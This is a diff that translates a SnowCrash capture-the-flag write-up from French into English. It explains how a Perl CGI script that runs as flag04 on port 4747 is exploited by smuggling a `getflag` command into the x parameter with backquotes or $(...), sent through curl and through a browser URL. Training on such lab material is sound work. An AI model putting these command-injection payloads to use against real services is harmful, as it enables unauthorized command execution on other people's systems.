@@ -1,7 +1,7 @@
-# apparition de la ligne suivante lors d'une recherche de fichiers :
-/rofs/var/www/level04
+# we came across this file in previous searches with 'find' :
+/var/www/level04
 
-# details du dossier: 
+# details of this directory: 
 level00@SnowCrash:~$ ls -la /var/www/
 total 4
 drwxr-xr-x  1 root   root    100 Jun 15 09:31 .
@@ -10,17 +10,17 @@ drwxr-xr-x  1 root   root    160 Mar 12  2016 ..
 dr-xr-x---+ 2 flag04 level04  60 Jun 15 09:31 level04
 dr-xr-x---+ 2 flag12 level12  60 Jun 15 09:31 level12
 
-=> le script perl print le parametre x d'une requete GET sur le port 4747 du serveur
+=> this perl script prints the parameter x of a GET request on the port 4747
 curl http://192.168.56.2:4747?x=12
 12
 
 
 
-# le script perl est executé avec les droits de flag04 : -r-xr-x---+ 1 flag04 level04 152 Jun 19 14:18 level04.pl
-la commande : curl localhost:4747?x=\`getflag\` execute getflag en tant que flag04
-les backquotes permettent d'evaluer la commande au moment du echo a la maniere d'un : echo `ls`
-il est important d'evaluer la commande a l'interieur du script et non au moment du curl sinon le getflag est executé en tant que level04
+the perl script is executed with flag04 permissions : -r-xr-x---+ 1 flag04 level04 152 Jun 19 14:18 level04.pl
+the command : "curl localhost:4747?x=\`getflag\`" executes getflag as user flag04
+the backquotes get the command evaluated inside the program as would do the command : echo `ls`
+it is important that the command is evaluated inside the program or else the getflag command will be executed as user level04
 
-les commandes qui evaluent getflag a l'interieur d'un navigateur fonctionnent : 
+these commands work inside a webbrowser : 
 http://192.168.56.2:4747/?x=`getflag`
 http://192.168.56.2:4747/?x=$(getflag)
